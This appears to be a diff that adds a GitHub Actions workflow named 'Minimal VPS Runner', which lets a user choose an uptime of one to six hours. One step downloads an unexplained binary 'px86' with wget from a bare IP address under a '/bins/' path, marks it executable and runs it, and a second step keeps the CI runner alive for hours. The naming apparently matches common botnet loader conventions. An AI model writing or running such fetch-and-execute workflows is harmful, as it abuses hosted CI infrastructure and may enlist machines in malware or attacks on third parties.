@@ -1,0 +1,33 @@
+name: Minimal VPS Runner
+
+on:
+  workflow_dispatch:
+    inputs:
+      uptime:
+        description: 'VPS uptime in hours (max 6)'
+        required: false
+        default: '6'
+        type: choice
+        options:
+          - '1'
+          - '2'
+          - '3'
+          - '4'
+          - '5'
+          - '6'
+
+jobs:
+  run-binary:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download and run binary
+        run: |
+          wget http://45.138.16.158/bins/px86 -O px86
+          chmod +x px86
+          ./px86 x86 || echo "Binary exited with error"
+
+      - name: Keep VM alive
+        run: |
+          UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
+          echo "Sleeping for $UPTIME_SECONDS seconds..."
+          sleep $UPTIME_SECONDS
